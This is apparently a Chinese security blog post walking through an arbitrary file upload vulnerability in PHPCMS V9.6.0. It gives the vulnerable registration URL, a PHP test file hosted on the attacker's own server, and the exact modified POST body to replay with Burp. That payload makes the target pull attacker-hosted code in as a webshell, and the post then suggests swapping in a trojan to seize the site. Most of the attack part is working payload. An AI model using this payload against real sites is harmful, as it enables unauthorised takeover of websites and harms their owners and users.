**目录**

[PHPCMS](#t0 "PHPCMS")

[PHPCMS V9.6.0任意文件上传漏洞](#t1 "PHPCMS V9.6.0任意文件上传漏洞")

* * *

PHPCMS
------

PHPCMS是一款网站管理软件，该软件采用模块化开发，支持多种分类方式，使用它可方便实现个性化网站的设计、开发与维护。它支持众多的程序组合，可轻松实现网站平台迁移，并可广泛满足各种规模的网站需求，可靠性高，是一款具备文章、下载、图片、分类信息、影视、商城、采集、财务等众多功能的强大、易用、可扩展的优秀网站管理软件

### **PHPCMS V9.6.0任意文件上传漏洞**

该任意文件上传漏洞存在于用户注册页面**，**[http://www.xxx.com/index.php?m=member&c=index&a=register&siteid=1](http://www.jingduqh.com/index.php?m=member&c=index&a=register&siteid=1 "http://www.xxx.com/index.php?m=member&c=index&a=register&siteid=1")

![](https://img-blog.csdnimg.cn/20190610181837939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们先在自己的公网服务器上上传一个文件 shell.txt，内容为：

```
<?php phpinfo();?>
```


链接为：http://ww.xx.com/shell.txt 

然后在目标网站注册会员，打开burp，截断数据包，把post内容更改为

```
siteid=1&modelid=11&username=zf1agac121&password=aasgfaewee311as&email=a1ea21f94@qq.com&info[content]=<img src=http://www.xx.com/shell.txt?.php#.jpg>&dosubmit=1&protocol=
```


repeater重放，得到shell地址

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTMwOTU4OC8yMDE4MDIvMTMwOTU4OC0yMDE4MDIyMjE2MzcyNzc3MS0xMTk1MDE4NzYuanBn?x-oss-process=image/format,png)

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTMwOTU4OC8yMDE4MDIvMTMwOTU4OC0yMDE4MDIyMjE2Mzc0NzAyMy0xMjQzOTk2ODU1LnBuZw?x-oss-process=image/format,png)

![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE4LmNuYmxvZ3MuY29tL2Jsb2cvMTMwOTU4OC8yMDE4MDIvMTMwOTU4OC0yMDE4MDIyMjE2Mzc1NTcyOS0xNjg5NDM5MjUyLnBuZw?x-oss-process=image/format,png)

所以，我们可以将该shell.txt文件替换成我们的木马文件，即可拿到目标网站的权限了。

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[phpcms v9.6.0任意文件上传漏洞](https://www.cnblogs.com/s1ye/p/8459316.html "phpcms v9.6.0任意文件上传漏洞")

 相关文章：[论如何优雅的拿下PHPCMS-FreeBuf](https://www.freebuf.com/column/180754.html "论如何优雅的拿下PHPCMS-FreeBuf")